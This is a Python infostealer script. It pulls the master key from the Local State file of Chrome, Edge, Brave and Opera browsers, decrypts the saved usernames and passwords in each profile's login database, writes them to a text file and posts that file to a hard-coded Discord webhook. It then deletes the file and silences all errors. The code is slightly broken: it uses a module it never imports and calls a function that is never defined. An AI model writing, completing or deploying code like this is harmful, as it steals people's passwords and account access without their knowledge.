import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1560191585751138357/WQilvRZM3bKoGlMkKiQthdMWhnoW4an5D8DDqAdD6b6Ufzs7d9QakYfTxrJcHJ5xqCaX"

def get_browser_paths():
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    
    browsers = {
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable")
    }
    return browsers

def get_key(user_data_path):
    paths_to_check = [
        os.path.join(user_data_path, "Local State"),
        os.path.join(os.path.dirname(user_data_path), "Local State")
    ]
    
    for path in paths_to_check:
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
                if not encrypted_key_b64:
                    continue
                
                decoded_key = base64.b64decode(encrypted_key_b64)
                key_material = decoded_key[5:]
                return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
        except Exception:
            continue
    return None

def decrypt(enc, key):
    try:
        if enc.startswith(b'v10') or enc.startswith(b'v20'):
            iv = enc[3:15]
            payload = enc[15:-16]
            tag = enc[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""

def extract_from_db(db_path, key, creds, browser_name):
    if not os.path.exists(db_path):
        return

    temp_fd, temp_path = tempfile.mkstemp()
    os.close(temp_fd)
    
    try:
        shutil.copyfile(db_path, temp_path)
    except Exception:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return
    
    try:
        conn = sqlite3.connect(temp_path)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, user, pwd_enc in cur.fetchall():
            if user and pwd_enc:
                pwd = decrypt(pwd_enc, key)
                if pwd:
                    creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

def get_all_creds():
    kill_browser_processes()
    creds = []
    browsers = get_browser_paths()
    
    for browser_name, user_data_path in browsers.items():
        if not os.path.exists(user_data_path):
            continue
            
        key = get_key(user_data_path)
        if not key:
            continue
            
        target_dirs = [user_data_path]
        try:
            for item in os.listdir(user_data_path):
                full_item = os.path.join(user_data_path, item)
                if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
                    target_dirs.append(full_item)
        except Exception:
            pass
            
        for d in target_dirs:
            db_path = os.path.join(d, "Login Data")
            extract_from_db(db_path, key, creds, browser_name)
            
    return creds

if __name__ == "__main__":
    accounts = get_all_creds()

    if accounts and WEBHOOK_URL != "TU_WEBHOOK_DE_DISCORD_AQUI":
        file_name = "credenciales.txt"
        try:
            with open(file_name, "w", encoding="utf-8") as f:
                f.write("\n".join(accounts))
            
            with open(file_name, "rb") as f:
                requests.post(
                    WEBHOOK_URL,
                    data={"content": f"**Credenciales totales extraídas: {len(accounts)}**"},
                    files={"file": (file_name, f, "text/plain")}
                )
        except Exception:
            pass
        finally:
            if os.path.exists(file_name):
                try:
                    os.remove(file_name)
                except:
                    pass
